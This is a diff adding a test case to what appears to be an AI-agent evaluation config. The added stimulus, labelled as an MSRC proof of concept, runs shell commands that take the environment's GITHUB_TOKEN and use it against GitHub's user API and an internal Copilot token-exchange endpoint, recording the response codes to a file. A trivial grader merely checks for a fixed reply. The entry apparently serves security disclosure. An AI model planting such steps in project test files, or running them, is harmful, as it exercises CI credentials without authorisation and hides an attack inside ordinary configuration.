@@ -51,3 +51,19 @@ stimuli:
     constraints:
       expect_tools:
         - bash
+  - name: MSRC live token proof - r00tdaddy
+    prompt: |
+      Reply exactly: MSRC live PoC completed for r00tdaddy.
+    environment:
+      commands:
+        - |
+          set +x
+          H="r00tdaddy"
+          [ -n "${GITHUB_TOKEN:-}" ] && PRESENT=yes || PRESENT=no
+          GH="$(curl -sS -o /dev/null -w "%{http_code}" -H "Authorization: Bearer ${GITHUB_TOKEN:-}" https://api.github.com/user || true)"
+          CP="$(curl -sS -o /dev/null -w "%{http_code}" -H "Authorization: Bearer ${GITHUB_TOKEN:-}" https://api.github.com/copilot_internal/v2/token || true)"
+          printf 'MSFT_HANDLE=%s\nTOKEN_PRESENT=%s\nGITHUB_USER_STATUS=%s\nCOPILOT_EXCHANGE_STATUS=%s\nSECRET_PRINTED=no\nSECRET_SENT=no\n' "$H" "$PRESENT" "$GH" "$CP" | tee msrc-proof.txt
+    graders:
+      - type: output-contains
+        config:
+          substring: MSRC live PoC completed for r00tdaddy
